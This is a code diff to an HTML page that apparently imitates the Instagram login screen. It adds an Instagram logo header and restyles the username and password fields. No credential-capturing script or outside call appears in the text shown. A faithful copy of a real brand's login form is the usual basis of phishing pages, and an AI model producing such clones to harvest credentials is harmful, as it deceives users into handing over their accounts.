@@ -12,6 +12,11 @@
 </head>
 
 <body>
+    <div class="mobile-header">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" alt="Instagram Logo"
+            class="mobile-logo">
+    </div>
+
     <div class="split-container">
         <!-- Left Pane -->
         <div class="left-pane">
@@ -51,13 +56,14 @@
                 </div>
 
                 <form id="login-form" class="ig-form">
-                    <div class="input-container">
-                        <input type="text" id="username" placeholder="Mobile number, username or email" required
-                            autocomplete="username">
+                    <div class="input-wrapper">
+                        <label for="username">Mobile number, username or email</label>
+                        <input type="text" id="username" placeholder="" required autocomplete="username">
                     </div>
-                    <div class="input-container password-container">
-                        <input type="password" id="password" placeholder="Password" required
-                            autocomplete="current-password" minlength="6">
+                    <div class="input-wrapper pass-wrapper">
+                        <label for="password">Password</label>
+                        <input type="password" id="password" placeholder="" required autocomplete="current-password"
+                            minlength="6">
                         <button type="button" class="eye-btn" aria-label="Toggle password visibility">
                             <svg class="eye-icon" fill="#8e8e8e" height="20" viewBox="0 0 24 24" width="20">
                                 <path
